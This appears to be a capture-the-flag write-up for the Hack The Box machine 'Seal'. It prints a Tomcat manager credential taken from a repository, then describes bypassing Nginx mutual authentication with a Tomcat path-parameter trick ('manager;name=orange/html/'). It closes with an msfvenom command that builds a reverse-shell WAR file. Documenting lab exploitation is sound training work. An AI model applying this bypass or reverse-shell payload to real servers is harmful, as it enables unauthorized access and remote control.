### Enum
Register the git bucket and review the codes
```html
<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
<!--
		  <role rolename="tomcat"/>
		  <role rolename="role1"/>
		  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
		  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
		  <user username="role1" password="<must-be-changed>" roles="role1"/>
		-->
		```

		s3cret


	## ToDo
		* Remove mutual authentication, setup registraion and login 
		* Deploy updated tomcat configuration
		* Disable manager and host-manager
		

Tho, `seal.htb/manager` won't work directly even I gave it correct creds. Other methods failed too.

Let's google about `Exploit Tomcat Nginx mutual authentication` since we saw it's Nginx + Tomcat.

### Blackhat!
* https://www.google.com/search?client=firefox-b-d&q=Exploit+Tomcat+Nginx+mutual+authentication
* https://rioasmara.com/2022/03/21/nginx-and-tomcat-mutual-auth-bypass/
* https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf


I would like to share a common mistake on Nginx configuration which could lead to authentication bypass. We are going to try to bypass Nginx mutual authentication

Below is the Nginx configuration that we are going to explore for exploitation. We can see from the above configuration that accessing `/manager/html`, `/admin/dashboard` and `/host-manager/html` would go to the mutual authentication check first. if the client does not provide the required certificate then error 403 will be returned.

view-source:https://10.129.95.190/admin/dashboards
```html
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

Based on the research from this blackhat 

* https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf 

that the two server (Nginx and Tomcat) will parse the http request differently thus lead to the known behaviour as below list. From page 42/87.

I can't believe how easy it is `https://10.129.95.190/manager;name=orange/html/`

### Hacktricks too
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#path-traversal-..
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat#msfvenom-reverse-shell

```bash
msfvenom -p java/shell_reverse_tcp LHOST=tun0 LPORT=80 -f war -o shell.war
```